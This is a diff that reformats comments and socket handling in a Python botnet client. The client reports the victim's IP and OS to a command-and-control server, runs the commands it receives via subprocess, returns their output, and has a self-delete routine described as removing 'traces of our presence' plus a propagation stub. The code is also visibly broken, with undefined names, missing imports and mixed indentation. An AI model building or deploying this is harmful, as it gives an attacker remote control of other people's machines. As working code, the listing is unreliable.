@@ -8,11 +8,11 @@ MODULE NAME: ______
 """
 
 try:
-	import socket 						# Import socket for creating TCP connection.
-	from subprocess import PIPE, run	# Import subprocess to execute system commands.
-	from os import devnull				# Import devnull from os to send stderr to devnull.
-	from sys import exit				# Import exit from sys to quit program when specified.
-	from platform import system         # Import system from platform to detect os.
+	import socket # Import socket for creating TCP connection.
+	from subprocess import PIPE, run # Import subprocess to execute system commands.
+	from os import devnull # Import devnull from os to send stderr to devnull.
+	from sys import exit # Import exit from sys to quit program when specified.
+	from platform import system # Import system from platform to detect os.
 except Exception:
     exit(1)
     
@@ -31,15 +31,15 @@ def create_client_socket(ip_addr: str, port: int):
 		Returns:
 			This function will return a socket object.
 	"""
-	client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     # Initializing socket.
-    conn = (ip_addr, port)                                              # Connect to server IP/Port.
-    sock.connect(conn)                                                  # Connection made.
-    host = socket.gethostname()                                         # Get local host name in order to then get IP.
-    client_ip = socket.gethostbyname(host)                              # Get local IP using host name.
-    initial_message = "IP=" + client_ip + ",os=" + system()             # Send IP address and OS information.
-    sock.send(initial_message.encode())                                 # Send message with this host's IP back to the server.
+	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_sock: # Initializing socket.
+		conn = (ip_addr, port) # Connect to server IP/Port.
+		sock.connect(conn) # Connection made.
+		host = socket.gethostname() # Get local host name in order to then get IP.
+		client_ip = socket.gethostbyname(host) # Get local IP using host name.
+		initial_message = "IP=" + client_ip + ",os=" + system() # Send IP address and OS information.
+		sock.send(initial_message.encode()) # Send message with this host's IP back to the server.
 
-    return client_sock													# Return the created client socket.
+    return client_sock # Return the created client socket.
 
 def self_delete(name: str):
     """This function will be invoked when the C&C server enter's the
@@ -52,8 +52,8 @@ def self_delete(name: str):
 		Returns:
 			None
 	"""
-	os.remove(name)             # Delete the local file to remove traces of our presence 
-	print("File Deleted")       # Print a confirmation
+	os.remove(name) # Delete the local file to remove traces of our presence 
+	print("File Deleted") # Print a confirmation
 	
 def propagate(name: str):
 	"""This function will create other instances of this file in 
@@ -85,10 +85,10 @@ class WindowsBot:
 			Returns:
 				Will return the output of the command that was executed.
 		"""
-		DEVNULL = open(devnull, 'w')                    # Open devnull file to send stderr to.
-		output = subprocess.run(cmd.split(),		    # Run command.
-								stdout=PIPE, 			# Pipe command to store in variable.
-								stderr=DEVNULL)			# Send standard error to devnull.
+		DEVNULL = open(devnull, 'w') # Open devnull file to send stderr to.
+		output = subprocess.run(cmd.split(), # Run command.
+								stdout=PIPE, # Pipe command to store in variable.
+								stderr=DEVNULL)	# Send standard error to devnull.
 		return output
 
 	def handle_request(self):
@@ -100,10 +100,10 @@ class WindowsBot:
 			Returns:
 				None
 		"""
-		sock = create_client_socket()					# Store socket object.
-		command = sock.recv(1024).decode('utf-8')		# Receive command from server.
-		command_output = self.exec_linux_cmd(command)	# Execute command on machine and store the response.
-		sock.send(command_output)						# Send the output to the C&C server.
+		sock = create_client_socket() # Store socket object.
+		command = sock.recv(1024).decode('utf-8') # Receive command from server.
+		command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
+		sock.send(command_output) # Send the output to the C&C server.
 		
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -123,10 +123,10 @@ class LinuxBot:
 			Returns:
 				Will return the output of the command that was executed.
 		"""
-		DEVNULL = open(devnull, 'w')					# Open devnull file to send stderr to.
-		output = subprocess.run(cmd.split(),  			# Run command.
-								stdout=PIPE, 			# Pipe command to store in variable.
-								stderr=DEVNULL)			# Send standard error to devnull.
+		DEVNULL = open(devnull, 'w') # Open devnull file to send stderr to.
+		output = subprocess.run(cmd.split(), # Run command.
+								stdout=PIPE, # Pipe command to store in variable.
+								stderr=DEVNULL)	# Send standard error to devnull.
 
 		return output
 
@@ -139,20 +139,20 @@ class LinuxBot:
 			Returns:
 				None
 		"""
-		sock = create_client_socket()					# Store socket object.
-		command = sock.recv(1024).decode('utf-8')		# Receive command from server.
-		command_output = self.exec_linux_cmd(command)	# Execute command on machine and store the response.
-		sock.send(command_output)						# Send the output to the C&C server.
+		sock = create_client_socket() # Store socket object.
+		command = sock.recv(1024).decode('utf-8') # Receive command from server.
+		command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
+		sock.send(command_output) # Send the output to the C&C server.
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 def main():
 	obj = None
-    OS = system()			# Determine operating system.
-	if OS == "Linux":		# Check if operating system is Linux.
-		obj = LinuxBot()	# If Linux, instantiate LinuxBot object.
+    OS = system() # Determine operating system.
+	if OS == "Linux": # Check if operating system is Linux.
+		obj = LinuxBot() # If Linux, instantiate LinuxBot object.
 	else:
-		obj = WindowsBot()	# Else, instantiate WindowsBot object.
+		obj = WindowsBot() # Else, instantiate WindowsBot object.
 
 	
 
